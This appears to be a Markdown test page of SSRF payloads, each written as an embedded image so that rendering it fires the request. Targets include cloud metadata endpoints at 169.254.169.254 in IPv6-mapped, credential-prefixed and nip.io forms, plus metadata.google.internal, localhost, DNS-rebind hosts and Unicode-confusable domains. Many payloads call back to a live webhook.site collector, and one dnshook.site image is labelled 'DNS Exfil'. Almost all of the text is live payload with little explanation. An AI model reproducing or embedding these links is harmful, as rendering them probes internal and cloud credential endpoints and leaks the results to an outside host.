# Security Research - v33

## Advanced Protocol & Header Attacks

Testing HTTP smuggling, header injection, and advanced URL manipulation.

---

### 1) Host Header Injection via URL

| Description | Image |
|-------------|-------|
| Basic webhook | ![1](https://webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-control.gif) |
| Host in path | ![2](https://1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site/127.0.0.1/v33.gif) |

---

### 2) Protocol-Relative URL Variations

| Format | Image |
|--------|-------|
| //webhook.site/path | ![p1](//webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-proto.gif) |
| ///webhook.site/path | ![p2](///webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-triple.gif) |

---

### 3) IPv4 mapped to IPv6 for Cloud Metadata

| Format | Image |
|--------|-------|
| [::ffff:169.254.169.254] | ![m1](http://[::ffff:169.254.169.254]/latest/meta-data/) |
| [0:0:0:0:0:ffff:a9fe:a9fe] | ![m2](http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/) |
| [::169.254.169.254] | ![m3](http://[::169.254.169.254]/latest/meta-data/) |

---

### 4) URL Parsing Differential - @ Symbol

| URL | Image |
|-----|-------|
| http://webhook.site@169.254.169.254/ | ![a1](http://webhook.site@169.254.169.254/v33.gif) |
| http://internal@webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/ | ![a2](http://internal@webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33.gif) |
| http://169.254.169.254@webhook.site/ | ![a3](http://169.254.169.254@webhook.site/v33.gif) |

---

### 5) DNS Rebind with Short TTL

| Service | Image |
|---------|-------|
| rebind.network | ![r1](http://rebind.network/v33.gif) |
| 127.0.0.1.rebind.network | ![r2](http://127.0.0.1.rebind.network/v33.gif) |

---

### 6) Unicode Hostname Normalization (IDNA)

| Domain | Image |
|--------|-------|
| ⓦⓔⓑⓗⓞⓞⓚ.site | ![u1](http://ⓦⓔⓑⓗⓞⓞⓚ.site/v33.gif) |
| ℌocalhost | ![u2](http://ℌocalhost/v33.gif) |
| ⒧ocalhost | ![u3](http://⒧ocalhost/v33.gif) |

---

### 7) Data URI Scheme

| Type | Image |
|------|-------|
| data:image/gif | ![d1](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7) |

---

### 8) URL Whitespace Variations

| Description | Image |
|-------------|-------|
| Tab between scheme | ![w1](http:	//webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-tab.gif) |
| Space in URL | ![w2](http: //webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-space.gif) |

---

### 9) Special Characters in Subdomain

| Subdomain | Image |
|-----------|-------|
| _internal.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site | ![s1](http://_internal.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site/v33.gif) |
| -prefix.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site | ![s2](http://-prefix.1cb608ae-d469-4acd-bbab-85f5aafe70d1.webhook.site/v33.gif) |

---

### 10) GCP/Azure Metadata Endpoints

| Cloud | Image |
|-------|-------|
| metadata.google.internal | ![g1](http://metadata.google.internal/computeMetadata/v1/) |
| 169.254.169.254.sslip.io GCP | ![g2](http://169.254.169.254.sslip.io/computeMetadata/v1/) |
| 169.254.169.254.nip.io Azure | ![a1](http://169.254.169.254.nip.io/metadata/instance?api-version=2021-02-01) |

---

### 11) URL with credentials and internal target

| URL | Image |
|-----|-------|
| http://admin:password@127.0.0.1:8080/ | ![c1](http://admin:password@127.0.0.1:8080/v33.gif) |
| http://user:pass@169.254.169.254/ | ![c2](http://user:pass@169.254.169.254/latest/meta-data/) |
| http://x@localhost/ | ![c3](http://x@localhost/v33.gif) |

---

### 12) Percent-encoded slash

| URL | Image |
|-----|-------|
| http://webhook.site%2f127.0.0.1/ | ![e1](http://webhook.site%2f127.0.0.1/v33.gif) |
| http://webhook.site%5c127.0.0.1/ | ![e2](http://webhook.site%5c127.0.0.1/v33.gif) |

---

### DNS Exfil

![dns](https://v33-dns.1cb608ae-d469-4acd-bbab-85f5aafe70d1.dnshook.site/dns.gif)

### Canary

![canary](https://webhook.site/1cb608ae-d469-4acd-bbab-85f5aafe70d1/v33-canary.gif)

---

*v33 - Advanced protocol & header attacks*
